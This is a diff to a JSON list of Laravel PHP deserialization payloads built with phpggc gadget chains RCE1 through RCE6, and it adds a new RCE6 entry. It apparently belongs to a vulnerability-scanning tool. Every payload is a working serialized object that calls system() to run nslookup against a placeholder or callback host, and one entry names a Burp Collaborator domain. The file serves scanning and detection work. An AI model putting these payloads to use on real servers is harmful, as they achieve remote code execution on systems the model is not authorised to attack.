@@ -19,34 +19,39 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel 5.4.27",
+    "name": "Laravel 5.4.27 (1)",
     "gen_with": "./phpggc Laravel/RCE1 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:15:\"Faker\\Generator\":1:{s:13:\"%00*%00formatters\"%3Ba:1:{s:8:\"dispatch\"%3Bs:6:\"system\"%3B}}s:8:\"%00*%00event\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel 5.5.39 (1)",
+    "name": "Laravel 5.5.39 (2)",
     "gen_with": "./phpggc Laravel/RCE2 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:\"%00*%00listeners\"%3Ba:1:{s:72:\"nslookup CHANGEME\"%3Ba:1:{i:0%3Bs:6:\"system\"%3B}}}s:8:\"%00*%00event\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel 5.5.39 (2)",
+    "name": "Laravel 5.5.39 (3)",
     "gen_with": "./phpggc Laravel/RCE3 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"%00*%00events\"%3BO:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"%00*%00app\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:17:\"%00*%00defaultChannel\"%3Bs:1:\"x\"%3Bs:17:\"%00*%00customCreators\"%3Ba:1:{s:1:\"x\"%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel 5.5.39 (3)",
+    "name": "Laravel 5.5.39 (4)",
     "gen_with": "./phpggc Laravel/RCE4 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\"%3Ba:1:{s:0:\"\"%3Bs:6:\"system\"%3B}}s:8:\"%00*%00event\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Laravel 5.8.30",
+    "name": "Laravel 5.8.30 (5)",
     "gen_with": "./phpggc Laravel/RCE5 \"system('nslookup CHANGEME');\"",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B exit%3B ?>\"%3B}}}"
   },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 5.5.* (6)",
+    "gen_with": "./phpggc Laravel/RCE6 \"system('nslookup CHANGEME');\"",
+    "payload": "O:29:\"Illuminate\\Support\\MessageBag\":2:{s:11:\"%00*%00messages\"%3Ba:0:{}s:9:\"%00*%00format\"%3BO:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup CHANGEME')%3B exit%3B ?>\"%3B}}}}"},
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Monolog 1.18 <= 1.23",
